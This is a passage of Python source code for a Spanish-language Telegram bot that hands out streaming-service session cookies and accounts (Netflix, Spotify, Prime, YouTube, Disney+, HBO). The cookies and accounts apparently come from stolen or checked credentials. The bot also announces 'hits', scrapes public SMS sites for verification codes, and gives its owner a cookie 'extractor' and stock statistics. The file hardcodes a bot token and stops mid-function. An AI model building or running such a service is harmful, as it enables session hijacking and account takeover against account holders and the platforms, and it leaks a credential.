import logging
import asyncio
import html
from datetime import datetime
import glob
import os
import shutil
import random
import json
import time
import sys
import re
import copy
import threading
import telegram.error
import requests
try:
    import psutil
except ImportError:
    psutil = None
import requests
from curl_cffi import requests as c_requests
from bs4 import BeautifulSoup
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from concurrent.futures import ThreadPoolExecutor

# --- OPTIMIZACIÓN PARA WINDOWS ---
if sys.platform == 'win32':
    asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())

# IMPORTAMOS TUS SCRIPTS ORIGINALES
import NetflixBot as nfx
import HBOMaxTV as hbo
import CrunchyTV as crunchy 
import CrunchyAuth as c_auth 
import HBOAuth_Browser as h_browser 
import AmazonAuth as amazon
import DisneyBot as disney
import ProxyManager
import CrunchyAuto
import PrimeChecker as p_check
import spotifycookie as spoty_cleaner
import YouTubeChecker as yt_check
import QRScanner as qr_vision
import ExtractorPro as extractor

# --- CONFIGURACIÓN HACKER ---
OWNER_ID = 8535723817
OWNER_HANDLE = "@Zzzz_0456"
TOKEN = "8712216613:AAG4-nPc-ypG5nvwrMHGjkFvvJddMqNf2MQ"
USERS_FILE = "bot_users.json"
PROFILES_FILE = "user_profiles.json"
REFERRALS_FILE = "referrals.json"
HBO_ACC_FILE = "hbo_accounts.json"
CRUNCHY_ACC_FILE = "crunchy_accounts.json"
DISNEY_ACC_FILE = "disney_accounts.txt"
PROXIES_FILE = "proxies.txt"
MAINTENANCE_FILE = "maintenance.json"
MAINTENANCE_MODULES = {
    "netflix": "NETFLIX COOKIE",
    "prime": "PRIME COOKIE",
    "spotify": "SPOTIFY COOKIE",
    "youtube": "YOUTUBE COOKIE",
}

# Canales obligatorios
REQUIRED_CHANNEL = "-1003798776175"
REQUIRED_GROUP = "-1003773284821"
HITS_CHANNEL = "@AppActivacion" 
START_TIME = time.time()

# --- ESCUADRÓN DE AGENTES DE ÉLITE ---
# Pool controlado: 8 agentes para mejorar la respuesta sin saturar conexiones
executor = ThreadPoolExecutor(max_workers=8, thread_name_prefix="Agente")

async def dispatch_mission(func, *args):
    """Asigna una tarea pesada al pool controlado y lo loguea en la terminal."""
    loop = asyncio.get_event_loop()
    
    def mission_wrapper(*args):
        agent_name = threading.current_thread().name
        print(f"🕵️‍♂️ [{agent_name}] Iniciando misión: {func.__name__}...")
        try:
            result = func(*args)
            print(f"✅ [{agent_name}] Misión completada.")
            return result
        except Exception as e:
            print(f"❌ [{agent_name}] ERROR EN MISIÓN: {e}")
            raise e

    print(f"📡 [SISTEMA] Misión detectada. Buscando agente disponible...")
    return await loop.run_in_executor(executor, mission_wrapper, *args)
user_cooldowns = {}
nf_cookie_cooldowns = {} 
spoty_cookie_cooldowns = {}
amazon_cookie_cooldowns = {}
yt_cookie_cooldowns = {}
disney_cooldowns = {}
disney_daily_usage = {} # {user_id: {"count": 0, "last_reset": timestamp}}
membership_cache = {}  # user_id: (timestamp, result)
MEMBERSHIP_CACHE_TTL = 120
COOLDOWN_TIME = 5
NF_COOKIE_COOLDOWN = 600 
SPOTY_COOKIE_COOLDOWN = 600
AMAZON_COOKIE_COOLDOWN = 600
YT_COOKIE_COOLDOWN = 600
DISNEY_COOLDOWN = 300
DISNEY_DAILY_LIMIT = 2

# --- GESTIÓN DE DATOS ---
async def safe_edit(message, text, parse_mode='HTML', reply_markup=None):
    """Edita un mensaje de forma segura ante errores de conexión."""
    try:
        return await message.edit_text(text, parse_mode=parse_mode, reply_markup=reply_markup)
    except Exception as e:
        print(f"Safe Edit Error: {e}")
        return None

def escape_html(text):
    """Escapa caracteres HTML para evitar errores en Telegram."""
    return str(text).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

def cargar_json(file, default):
    if not os.path.exists(file):
        with open(file, 'w') as f: json.dump(default, f)
        return default
    try:
        with open(file, 'r') as f: return json.load(f)
    except: return default

def guardar_json(file, data):
    with open(file, 'w') as f: json.dump(data, f)


def load_maintenance_state():
    state = cargar_json(MAINTENANCE_FILE, {})
    return {key: bool(state.get(key, False)) for key in MAINTENANCE_MODULES}


def set_maintenance(module, enabled):
    state = load_maintenance_state()
    if module not in MAINTENANCE_MODULES:
        return False
    state[module] = bool(enabled)
    guardar_json(MAINTENANCE_FILE, state)
    return True


def maintenance_label(module):
    return "🛠️ MANTENIMIENTO" if load_maintenance_state().get(module, False) else MAINTENANCE_MODULES[module]


def maintenance_blocked(module):
    return load_maintenance_state().get(module, False)


async def maintenance_guard(query, module):
    if maintenance_blocked(module):
        await query.answer(f"🛠️ {MAINTENANCE_MODULES[module]} EN MANTENIMIENTO", show_alert=True)
        return False
    return True

def guardar_usuario(user_id):
    usuarios = cargar_json(USERS_FILE, [])
    if user_id not in usuarios:
        usuarios.append(user_id)
        guardar_json(USERS_FILE, usuarios)

def register_referral(user_id, payload):
    """Registra una atribución única de referido sin permitir auto-referidos."""
    if not payload or not str(payload).startswith("ref_"):
        return False
    try:
        referrer_id = int(str(payload).split("_", 1)[1])
        user_id = int(user_id)
    except (TypeError, ValueError):
        return False
    if referrer_id == user_id:
        return False

    data = cargar_json(REFERRALS_FILE, {"users": {}, "stats": {}})
    data.setdefault("users", {})
    data.setdefault("stats", {})
    key = str(user_id)
    if key in data["users"]:
        return False

    data["users"][key] = {
        "referrer": referrer_id,
        "joined_at": int(time.time())
    }
    ref_key = str(referrer_id)
    data["stats"][ref_key] = int(data["stats"].get(ref_key, 0)) + 1
    guardar_json(REFERRALS_FILE, data)
    return True


def get_referral_stats(user_id):
    data = cargar_json(REFERRALS_FILE, {"users": {}, "stats": {}})
    count = int(data.get("stats", {}).get(str(user_id), 0))
    return count


def build_referral_link(bot_username, user_id):
    username = str(bot_username or "").lstrip("@").strip()
    return f"https://t.me/{username}?start=ref_{user_id}" if username else "Enlace no disponible"


def update_user_profile(user):
    """Registra los datos públicos del usuario sin guardar su foto permanentemente."""
    profiles = cargar_json(PROFILES_FILE, {})
    key = str(user.id)
    previous = profiles.get(key, {})
    profiles[key] = {
        "user_id": user.id,
        "username": user.username or previous.get("username", ""),
        "first_name": user.first_name or previous.get("first_name", "Agent"),
        "last_name": user.last_name or previous.get("last_name", ""),
        "hits": int(previous.get("hits", 0)),
        "created_at": previous.get("created_at", int(time.time())),
        "updated_at": int(time.time())
    }
    guardar_json(PROFILES_FILE, profiles)
    return profiles[key]

def increment_user_hits(user):
    profile = update_user_profile(user)
    profiles = cargar_json(PROFILES_FILE, {})
    key = str(user.id)
    profile["hits"] = int(profile.get("hits", 0)) + 1
    profile["updated_at"] = int(time.time())
    profiles[key] = profile
    guardar_json(PROFILES_FILE, profiles)
    return profile

async def ref_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.type != 'private': return
    user = update.effective_user
    if not await check_membership(context.bot, user.id): return
    count = get_referral_stats(user.id)
    link = build_referral_link(context.bot.username, user.id)
    message = (
        "<code>╔══════════════════════════════╗\n"
        "║       REFERRAL SYSTEM       ║\n"
        "╚══════════════════════════════╝</code>\n\n"
        f"🔗 <b>Tu enlace personal:</b>\n<code>{escape_html(link)}</code>\n\n"
        f"👥 <b>Referidos registrados:</b> {count}\n"
        "🎁 Comparte el enlace para invitar nuevos usuarios."
    )
    await update.message.reply_html(message + FOOTER)


async def perfil(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Muestra una tarjeta del perfil público del usuario solicitante."""
    if update.effective_chat.type != 'private': return
    user = update.effective_user
    if not await check_membership(context.bot, user.id):
        await update.message.reply_html(ACCESS_DENIED_MSG)
        return

    profile = update_user_profile(user)
    username = f"@{profile['username']}" if profile.get('username') else "Sin username"
    full_name = " ".join(x for x in [profile.get('first_name'), profile.get('last_name')] if x).strip() or "Agent"
    hits = int(profile.get('hits', 0))
    created = time.strftime("%Y-%m-%d", time.localtime(profile.get("created_at", time.time())))

    card = (
        "<code>\n"
        "╔══════════════════════════════════╗\n"
        "║       ░▒▓█ HACKER ID █▓▒░        ║\n"
        "╠══════════════════════════════════╣\n"
        f"║ 👤 NOMBRE: {escape_html(full_name)[:24]:<24} ║\n"
        f"║ 🔗 USER:   {escape_html(username)[:24]:<24} ║\n"
        f"║ 🆔 ID:     {user.id:<24} ║\n"
        "╠══════════════════════════════════╣\n"
        f"║ ✅ REFES:  {hits:<24} ║\n"
        f"║ 📅 ALTA:   {created:<24} ║\n"
        "╚══════════════════════════════════╝\n"
        "</code>"
    ) + FOOTER

    try:
        photos = await context.bot.get_user_profile_photos(user.id, limit=1)
        if photos.total_count and photos.photos:
            photo_id = photos.photos[0][-1].file_id
            await update.message.reply_photo(photo=photo_id, caption=card, parse_mode='HTML')
            return
    except Exception as e:
        logging.warning("No se pudo obtener la foto de perfil: %s", e)

    await update.message.reply_html(card)

# --- LÓGICA DE MEMBRESÍA ---
async def check_membership(bot, user_id):
    if user_id == OWNER_ID: return True

    cached = membership_cache.get(user_id)
    if cached and time.time() - cached[0] < MEMBERSHIP_CACHE_TTL:
        return cached[1]

    async def check_chat(chat):
        try:
            member = await bot.get_chat_member(chat, user_id)
            return member.status not in ["left", "kicked"]
        except Exception:
            return False

    channel_ok, group_ok = await asyncio.gather(
        check_chat(REQUIRED_CHANNEL),
        check_chat(REQUIRED_GROUP)
    )
    result = channel_ok and group_ok
    membership_cache[user_id] = (time.time(), result)
    return result

# --- SISTEMA DE HITS Y REFERENCIAS ---
async def post_hit(context, username, platform, photo=None):
    try:
        if photo:
            caption = (
                "━━━━━━━━━━━━━━━━━━━━\n"
                "📸 <b>REFERENCIA RECIBIDA</b> 📸\n"
                "━━━━━━━━━━━━━━━━━━━━\n\n"
                f"👤 <b>USER:</b> @{username}\n"
                f"🚀 <b>SERVICE:</b> {platform}\n"
                "🛡️ <b>STATUS:</b> VERIFIED\n\n"
                f"👑 <b>OWNER:</b> {OWNER_HANDLE}\n"
                "━━━━━━━━━━━━━━━━━━━━"
            )
            await context.bot.send_photo(chat_id=HITS_CHANNEL, photo=photo, caption=caption, parse_mode='HTML')
        else:
            hit_msg = (
                "━━━━━━━━━━━━━━━━━━━━\n"
                "🔥 <b>HIT DETECTADO</b> 🔥\n"
                "━━━━━━━━━━━━━━━━━━━━\n\n"
                f"👤 <b>USER:</b> @{username}\n"
                f"🚀 <b>SERVICE:</b> {platform}\n"
                "🛡️ <b>STATUS:</b> SUCCESSFUL\n\n"
                f"👑 <b>OWNER:</b> {OWNER_HANDLE}\n"
                "━━━━━━━━━━━━━━━━━━━━"
            )
            await context.bot.send_message(chat_id=HITS_CHANNEL, text=hit_msg, parse_mode='HTML')
    except Exception as e:
        print(f"Error publicando hit: {e}")

# --- SISTEMA DE TEMP MAIL ---
def get_random_email():
    try:
        r = requests.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
        return r.json()[0]
    except: return None

def check_inbox_api(login, domain):
    try:
        r = requests.get(f"https://www.1secmail.com/api/v1/?action=getMessages&login={login}&domain={domain}")
        return r.json()
    except: return []

def read_message_api(login, domain, msg_id):
    try:
        r = requests.get(f"https://www.1secmail.com/api/v1/?action=readMessage&login={login}&domain={domain}&id={msg_id}")
        return r.json()
    except: return None

# --- SISTEMA DE SMS VIRTUAL ---
SMS_URL_CACHE = {}

def get_public_numbers():
    global SMS_URL_CACHE
    try:
        r = c_requests.get("https://receive-sms-free.cc/", impersonate="chrome120", timeout=15)
        soup = BeautifulSoup(r.text, 'html.parser')
        numbers = []
        for a in soup.find_all('a', href=True):
            href = a['href']
            if "-Phone-Number/" in href and not href.endswith("-Phone-Number/"):
                text = a.get_text(separator=' ', strip=True)
                parts = href.strip("/").split("/")
                if len(parts) >= 2:
                    potential_num = parts[-1]
                    if potential_num.isdigit():
                        country_part = text.split("Phone Number")[0].strip()
                        display = "+" + potential_num
                        url = "https://receive-sms-free.cc" + href if not href.startswith("http") else href
                        SMS_URL_CACHE[potential_num] = url
                        numbers.append({
                            "number": potential_num,
                            "display": display,
                            "country": country_part,
                            "url": url
                        })
        unique = {}
        for n in numbers:
            unique[n['number']] = n
        return list(unique.values())[:8]
    except Exception as e:
        print(f"[-] SMS Error: {e}")
        return []

def get_sms_messages(phone_number):
    url = SMS_URL_CACHE.get(phone_number)
    if not url:
        get_public_numbers()
        url = SMS_URL_CACHE.get(phone_number)
    if not url:
        return []
    try:
        r = c_requests.get(url, impersonate="chrome120", timeout=15)
        soup = BeautifulSoup(r.text, 'html.parser')
        candidates = []
        for p in soup.find_all(['p', 'div', 'li', 'span']):
            t = p.get_text(separator=' ', strip=True)
            if ("ago" in t or "min" in t or "hour" in t) and len(t) < 200 and len(t.split()) > 2:
                if any(kw in t.lower() for kw in ['code', 'is', 'verification', 'otp', 'token', 'cuenta', 'tinder', 'instagram', 'tiktok', 'facebook', 'samsung', 'telegram', 'wechat']):
                    candidates.append(t)
        candidates = sorted(list(set(candidates)), key=len, reverse=True)
        final_msgs = []
        for c in candidates:
            if not any(c != other and c in other for other in candidates):
                final_msgs.append({"sender": "SMS Web", "time": "Reciente", "content": c})
        return final_msgs[:5]
    except Exception as e:
        print(f"[-] SMS Messages Error: {e}")
        return []

# --- DISEÑO VISUAL HACKER ---
FEEDBACK_MARKUP = InlineKeyboardMarkup([
    [InlineKeyboardButton("✅ FUNCIONÓ", callback_data="feedback_ok"),
     InlineKeyboardButton("❌ NO FUNCIONÓ", callback_data="feedback_fail")]
])

ACCESS_DENIED_MSG = (
    "<code>\n"
    " ╔══════════════════════════════════╗\n"
    " ║   [!] ACCESS DENIED: UNAUTHORIZED ║\n"
    " ╠══════════════════════════════════╣\n"
    " ║ Para usar este sistema debes     ║\n"
    " ║ estar unido a nuestro Canal y   ║\n"
    " ║ Grupo oficial.                  ║\n"
    " ╚══════════════════════════════════╝\n"
    "</code>"
)

START_VIDEO = "start.mp4"
START_IMAGE = "start.jpg"

START_MSG = (
    "<b>👤 Hello {name}, bienvenido a @AppsActivations_bot</b>\n"
    "━━━━━━━━━━━━━━━━━━━━\n"
    "<code>[UsersDB: {users}] | Time &gt; {time} [{flag}]</code>\n"
    "━━━━━━━━━━━━━━━━━━━━\n"
    "⚡ Centro de servicios y herramientas\n\n"
    "<i>Para ver mis comandos, interactúa con mis botones.</i>"
) 

START_COMMANDS_MARKUP = InlineKeyboardMarkup([
    [InlineKeyboardButton("[ COMMANDS ]", callback_data="menu_commands")],
    [InlineKeyboardButton("[ OWNER ] ↗", url=f"https://t.me/{OWNER_HANDLE.replace('@', '')}"),
     InlineKeyboardButton("[ REFS ] ↗", url="https://t.me/Zzz_0313")],
    [InlineKeyboardButton("[ TOOLS ]", callback_data="menu_tools")]
])

COMMANDS_MARKUP = InlineKeyboardMarkup([
    [InlineKeyboardButton("📺 APPS / TV", callback_data="menu_apps_tv"), InlineKeyboardButton("🍪 COOKIES", callback_data="menu_cookies")],
    [InlineKeyboardButton("👤 CUENTAS ACC", callback_data="menu_accounts")],
    [InlineKeyboardButton("🔙 VOLVER", callback_data="start_home")]
])

TOOLS_MARKUP = InlineKeyboardMarkup([
    [InlineKeyboardButton("🔙 INICIO", callback_data="start_home")]
])

HELP_MARKUP = InlineKeyboardMarkup([
    [InlineKeyboardButton("📺 ACTIVACIONES TV", callback_data="help_tv")],
    [InlineKeyboardButton("📷 GUÍA QR", callback_data="help_qr"), InlineKeyboardButton("⚠️ ERRORES", callback_data="help_errors")],
    [InlineKeyboardButton("🔙 TOOLS", callback_data="menu_tools")]
])

HELP_TV_MARKUP = InlineKeyboardMarkup([
    [InlineKeyboardButton("⚡ NETFLIX TV", callback_data="help_netflix")],
    [InlineKeyboardButton("🔥 HBO TV", callback_data="help_hbo"), InlineKeyboardButton("🌀 CRUNCHYROLL TV", callback_data="help_crunchy")],
    [InlineKeyboardButton("🔙 AYUDA", callback_data="menu_help")]
])

HELP_NETFLIX_MARKUP = InlineKeyboardMarkup([
    [InlineKeyboardButton("🎥 VER VIDEO", callback_data="help_netflix_video")],
    [InlineKeyboardButton("🔙 ACTIVACIONES TV", callback_data="help_tv")]
])

HELP_VIDEO = "netflix_tv_help.mp4"

APPS_TV_MARKUP = InlineKeyboardMarkup([
    [InlineKeyboardButton("⚡ NETFLIX TV", callback_data="menu_nfx"), InlineKeyboardButton("🔥 HBO TV", callback_data="menu_hbo")],
    [InlineKeyboardButton("🌀 CRUNCHYROLL TV", callback_data="menu_crunchy")],
    [InlineKeyboardButton("🔙 COMMANDS", callback_data="menu_commands")]
])

def build_cookies_markup():
    state = load_maintenance_state()
    netflix = "🛠️ NETFLIX (MANT.)" if state["netflix"] else "🍪 NETFLIX COOKIE"
    spotify = "🛠️ SPOTIFY (MANT.)" if state["spotify"] else "🎧 SPOTIFY COOKIE"
    prime = "🛠️ PRIME (MANT.)" if state["prime"] else "📦 PRIME COOKIE"
    youtube = "🛠️ YOUTUBE (MANT.)" if state["youtube"] else "🔴 YOUTUBE COOKIE"
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(netflix, callback_data="get_nf_cookie"), InlineKeyboardButton(spotify, callback_data="get_spoty_cookie")],
        [InlineKeyboardButton(prime, callback_data="get_amazon_cookie"), InlineKeyboardButton(youtube, callback_data="get_youtube_cookie")],
        [InlineKeyboardButton("🔙 COMMANDS", callback_data="menu_commands")]
    ])

COOKIES_MARKUP = build_cookies_markup()

ACCOUNTS_MARKUP = InlineKeyboardMarkup([
    [InlineKeyboardButton("🏰 DISNEY+ ACC", callback_data="get_disney_acc"), InlineKeyboardButton("🔥 HBO ACC", callback_data="get_hbo_acc")],
    [InlineKeyboardButton("🔙 COMMANDS", callback_data="menu_commands")]
])

START_MSG = START_MSG


def build_start_message(user, users_count):
    display_name = html.escape(user.first_name or "Agent")
    current_time = datetime.now().strftime("%H:%M")
    return START_MSG.format(name=display_name, users=users_count, time=current_time, flag="🌐")

FOOTER = f"\n\n<code>// OWNER: {OWNER_HANDLE} // 🛠️</code>"

# --- COMANDOS ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # El bot solo interactúa en privado para evitar spam en grupos.
    if update.effective_chat.type != 'private': return

    user_id = update.effective_user.id
    referral_payload = context.args[0] if context.args else ""
    # Registro, perfil y atribución se ejecutan sin bloquear el event loop.
    await asyncio.gather(
        asyncio.to_thread(guardar_usuario, user_id),
        asyncio.to_thread(update_user_profile, update.effective_user),
        asyncio.to_thread(register_referral, user_id, referral_payload)
    )
    if not await check_membership(context.bot, user_id):
        keyboard = [
            [InlineKeyboardButton("📢 UNIRSE AL CANAL", url="https://t.me/+e7DsGA4mSoM5NTJh")],
            [InlineKeyboardButton("👥 UNIRSE AL GRUPO", url="https://t.me/+U-fi-8qv609lNzAx")],
            [InlineKeyboardButton("✅ VERIFICAR ACCESO", callback_data="check_join")]
        ]
        await update.message.reply_html(ACCESS_DENIED_MSG, reply_markup=InlineKeyboardMarkup(keyboard))
        return
    
    total_users = len(cargar_json(USERS_FILE, []))
    start_text = build_start_message(update.effective_user, total_users)
    if os.path.exists(START_VIDEO):
        with open(START_VIDEO, "rb") as video:
            await update.message.reply_video(video=video, caption=start_text, parse_mode="HTML", reply_markup=START_COMMANDS_MARKUP, supports_streaming=True)
    elif os.path.exists(START_IMAGE):
        with open(START_IMAGE, "rb") as photo:
            await update.message.reply_photo(photo=photo, caption=start_text, parse_mode="HTML", reply_markup=START_COMMANDS_MARKUP)
    else:
        await update.message.reply_html(start_text, reply_markup=START_COMMANDS_MARKUP)

async def open_help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.type != 'private':
        return
    if not await check_membership(context.bot, update.effective_user.id):
        await update.message.reply_html(ACCESS_DENIED_MSG)
        return
    help_text = (
        "<code>╔══════════════════════╗\n"
        "║     CENTRO DE AYUDA  ║\n"
        "╚══════════════════════╝</code>\n\n"
        "📚 Guías rápidas para usar los módulos de streaming.\n"
        "Selecciona una categoría para continuar."
    )
    await update.message.reply_html(help_text + FOOTER, reply_markup=HELP_MARKUP)


async def mantenimiento(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.type != 'private' or update.effective_user.id != OWNER_ID:
        return
    args = [str(arg).lower().strip() for arg in context.args]
    state = load_maintenance_state()
    if not args or args[0] == 'estado':
        rows = [f"{'🛠️' if state[key] else '🟢'} {label}: {'MANTENIMIENTO' if state[key] else 'ONLINE'}" for key, label in MAINTENANCE_MODULES.items()]
        await update.message.reply_html("<code>█▓▒░ MAINTENANCE STATUS ░▒▓█\n\n" + "\n".join(rows) + "</code>" + FOOTER)
        return
    aliases = {'amazon': 'prime', 'prime': 'prime', 'netflix': 'netflix', 'spotify': 'spotify', 'youtube': 'youtube', 'yt': 'youtube'}
    module = aliases.get(args[0])
    if not module or len(args) < 2 or args[1] not in {'on', 'off', 'activar', 'desactivar'}:
        await update.message.reply_html("<code>USO: /mantenimiento estado\n/mantenimiento netflix on|off\n/mantenimiento prime on|off\n/mantenimiento spotify on|off\n/mantenimiento youtube on|off</code>")
        return
    enabled = args[1] in {'on', 'activar'}
    set_maintenance(module, enabled)
    await update.message.reply_html(f"<code>{'🛠️ MANTENIMIENTO ACTIVADO' if enabled else '✅ MÓDULO REACTIVADO'}\n[>] {MAINTENANCE_MODULES[module]}\n[>] Estado: {'MANTENIMIENTO' if enabled else 'ONLINE'}</code>{FOOTER}")


async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != OWNER_ID: return
    
    admin_msg = (
        "<code>\n"
        " ╔══════════════════════════════════╗\n"
        " ║   ░▒▓█ OWNER COMMAND CENTER █▓▒░  ║\n"
        " ╠══════════════════════════════════╣\n"
        " ║ Bienvenido al núcleo del sistema.║\n"
        " ║ Selecciona una acción de control:║\n"
        " ╚══════════════════════════════════╝\n"
        "</code>"
    )
    
    keyboard = [
        [InlineKeyboardButton("📊 VER ESTADÍSTICAS", callback_data="admin_stats")],
        [InlineKeyboardButton("🧹 PURGAR AMAZON", callback_data="admin_clean_amazon"), InlineKeyboardButton("🧹 PURGAR SPOTIFY", callback_data="admin_clean_spotify")],
        [InlineKeyboardButton("🧹 PURGAR YOUTUBE", callback_data="admin_clean_youtube"), InlineKeyboardButton("🏰 CHECK DISNEY DB", callback_data="admin_check_disney")],
        [InlineKeyboardButton("🛠️ ESTADO MANTENIMIENTO", callback_data="admin_maintenance")],
        [InlineKeyboardButton("🖥️ MONITOR AGENTES", callback_data="admin_monitor")],
        [InlineKeyboardButton("📄 EXTRACTOR PRO", callback_data="admin_extractor")],
        [InlineKeyboardButton("📡 DIFUSIÓN GLOBAL", callback_data="admin_broadcast")],
        [InlineKeyboardButton("🔙 CERRAR PANEL", callback_data="check_join")]
    ]
    if update.callback_query:
        await update.callback_query.edit_message_text(admin_msg + FOOTER, parse_mode='HTML', reply_markup=InlineKeyboardMarkup(keyboard))
    else:
        await update.message.reply_html(admin_msg + FOOTER, reply_markup=InlineKeyboardMarkup(keyboard))

async def handle_admin_monitor(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Muestra el estado de los agentes y del sistema en tiempo real."""
    query = update.callback_query
    
    # 1. Calcular Uptime
    uptime_sec = int(time.time() - START_TIME)
    hours, remainder = divmod(uptime_sec, 3600)
    minutes, seconds = divmod(remainder, 60)
    uptime_str = f"{hours}h {minutes}m {seconds}s"
    
    # 2. Contar Agentes Activos (Hilos en el executor)
    # Buscamos hilos que empiecen con "Agente"
    active_agents = 0
    for thread in threading.enumerate():
        if thread.name and thread.name.startswith("Agente"):
            active_agents += 1
    
    # 3. Obtener RAM y CPU (si psutil está disponible)
    ram_usage = "N/A"
    cpu_usage = "N/A"
    if psutil:
        try:
            process = psutil.Process(os.getpid())
            ram_usage = f"{process.memory_info().rss / 1024 / 1024:.1f} MB"
            cpu_usage = f"{psutil.cpu_percent()}%"
        except: pass
    
    # 4. Total Usuarios Registrados
    usuarios = cargar_json(USERS_FILE, [])
    total_users = len(usuarios)

    monitor_msg = (
        "<code>\n"
        " ╔══════════════════════════════════╗\n"
        " ║   ░▒▓█ AGENT MONITOR PRO █▓▒░    ║\n"
        " ╠══════════════════════════════════╣\n"
        f" ║ 🕵️‍♂️ AGENTES EN GUARDIA: 4         ║\n"
        f" ║ ⚡ AGENTES ACTIVOS: {active_agents:<13}║\n"
        " ╠══════════════════════════════════╣\n"
        f" ║ ⏱️ UPTIME: {uptime_str:<21}║\n"
        f" ║ 🧠 RAM: {ram_usage:<24}║\n"
        f" ║ 💻 CPU: {cpu_usage:<24}║\n"
        " ╠══════════════════════════════════╣\n"
        f" ║ 👥 USUARIOS TOTALES: {total_users:<12}║\n"
        " ╚══════════════════════════════════╝\n"
        "</code>"
    )
    
    await query.edit_message_text(monitor_msg + FOOTER, parse_mode='HTML', reply_markup=InlineKeyboardMarkup([
        [InlineKeyboardButton("🔄 ACTUALIZAR", callback_data="admin_monitor")],
        [InlineKeyboardButton("🔙 VOLVER AL PANEL", callback_data="admin_panel")]
    ]))

async def handle_admin_extraction(update, context, content):
    status_msg = await update.message.reply_html("<code>[+] INITIATING MINING OPERATION...\n[+] ANALYZING DATA...</code>")
    
    # Detectar servicio (muy básico)
    service = "unknown"
    if "disney" in content.lower(): service = "disney"
    elif "amazon" in content.lower() or "at-main" in content: service = "amazon"
    elif "spotify" in content.lower() or "sp_dc" in content: service = "spotify"
    
    data, status = extractor.extract_info_from_cookie(content, service)
    if status == "SUCCESS":
        report = extractor.format_extraction_report(data)
        await status_msg.edit_text(report + FOOTER, parse_mode='HTML')
    else:
        await status_msg.edit_text(f"<code>{status}</code>" + FOOTER, parse_mode='HTML')
    
    context.user_data['mode'] = None

async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID: return
    msg_text = " ".join(context.args)
    if not msg_text:
        await update.message.reply_html("<code>[!] USO: /difusion <mensaje></code>")
        return
    usuarios = cargar_json(USERS_FILE, [])
    exitos = 0
    broadcast_msg = f"━━━━━━━━━━━━━━━━━━━━\n░▒▓█ <b>COMUNICADO DEL OWNER</b> █▓▒░\n━━━━━━━━━━━━━━━━━━━━\n\n{msg_text}\n\n👑 <b>OWNER:</b> {OWNER_HANDLE}\n━━━━━━━━━━━━━━━━━━━━"
    for user_id in usuarios:
        try:
            await context.bot.send_message(chat_id=user_id, text=broadcast_msg, parse_mode='HTML')
            exitos += 1
            await asyncio.sleep(0.05)
        except: pass
    await update.message.reply_html(f"<code>[✔] DIFUSIÓN FINALIZADA\n[>] Exitos: {exitos}</code>")

async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID: return
    usuarios = cargar_json(USERS_FILE, [])
    nf_cookies = len(glob.glob(os.path.join("vault", "*")))
    hbo_accs = len(cargar_json(HBO_ACC_FILE, []))
    spoty_cookies = len(glob.glob(os.path.join("cookies_spotify", "*")))
    amazon_cookies = len(glob.glob(os.path.join("cookies_amazon", "*")))
    
    disney_accs = 0
    if os.path.exists(DISNEY_ACC_FILE):
        with open(DISNEY_ACC_FILE, "r") as f:
            disney_accs = len([l for l in f if l.strip()])
            
    proxies = 0
    if os.path.exists(PROXIES_FILE):
        with open(PROXIES_FILE, "r") as f:
            proxies = len([l for l in f if l.strip()])
            
    msg = (
        "<code>\n"
        " █▓▒░ SYSTEM STATISTICS ░▒▓█\n\n"
        f" [>] Total Usuarios: {len(usuarios)}\n"
        f" [>] Cookies NF (Vault): {nf_cookies}\n"
        f" [>] Cookies Spotify: {spoty_cookies}\n"
        f" [>] Cookies Amazon: {amazon_cookies}\n"
        f" [>] Cuentas HBO Live: {hbo_accs}\n"
        f" [>] Cuentas Disney+: {disney_accs}\n"
        f" [>] Proxies Activos: {proxies}\n"
        "</code>"
    )
    await update.effective_message.reply_html(msg + FOOTER)

async def tv_wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.type != 'private': return
    try:
        await nfx.tv_command(update, context)
    except telegram.error.TimedOut:
        await update.message.reply_html("<code>⚠️ Error: La conexión con Netflix ha expirado.</code>")
    except Exception as e:
        print(f"Error en comando /tv: {e}")

# --- MANEJADORES ---
async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    await query.answer()
    
    if query.data != "check_join" and not await check_membership(context.bot, user_id):
        await query.answer("⚠️ Acceso denegado.", show_alert=True)
        return

    if query.data == "check_join":
        if await check_membership(context.bot, user_id):
            await query.edit_message_text("<code>[+] ACCESS GRANTED.</code>", parse_mode='HTML')
            await start(update, context)
        else:
            await query.answer("❌ Únete a los grupos.", show_alert=True)
    
    elif query.data == "my_refs":
        count = get_referral_stats(query.from_user.id)
        link = build_referral_link(context.bot.username, query.from_user.id)
        refs_text = (
            "<code>╔══════════════════════════════╗\n"
            "║       REFERRAL SYSTEM       ║\n"
            "╚══════════════════════════════╝</code>\n\n"
            f"🔗 <b>Tu enlace personal:</b>\n<code>{escape_html(link)}</code>\n\n"
            f"👥 <b>Referidos registrados:</b> {count}\n"
            "🎁 Comparte el enlace para invitar nuevos usuarios."
        )
        if query.message.photo or query.message.video:
            await query.edit_message_caption(caption=refs_text + FOOTER, parse_mode="HTML", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 VOLVER", callback_data="start_home")]]))
        else:
            await query.edit_message_text(refs_text + FOOTER, parse_mode="HTML", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 VOLVER", callback_data="start_home")]]))

    elif query.data == "start_home":
        total_users = len(cargar_json(USERS_FILE, []))
        start_text = build_start_message(query.from_user, total_users)
        if query.message.photo or query.message.video:
            await query.edit_message_caption(caption=start_text, parse_mode="HTML", reply_markup=START_COMMANDS_MARKUP)
        else:
